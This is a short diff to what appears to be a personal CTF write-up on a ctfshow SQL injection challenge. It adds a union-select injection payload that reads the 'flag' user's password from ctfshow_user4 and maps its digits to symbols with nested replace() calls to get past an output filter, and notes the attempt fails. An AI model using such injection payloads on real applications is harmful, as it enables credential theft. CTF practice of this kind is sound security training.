@@ -201,3 +201,8 @@ mysql> select id, username, password from ctfshow_user4 where username != 'flag'
 ```
 #### Try Online
 ![[Pasted image 20241221103330.png]]
+When we use the completed code to execute searching, we can't get the result:
+```
+999' union select 'AAAA', replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password, '0', ')'), '1', '!'), '2', '@'), '3', '#'), '4', '$'), '5', '%'), '6', '^'), '7', '&'), '8', '*'), '9', '(') from ctfshow_user4 where username = 'flag
+```
+![[Pasted image 20241221105315.png]]
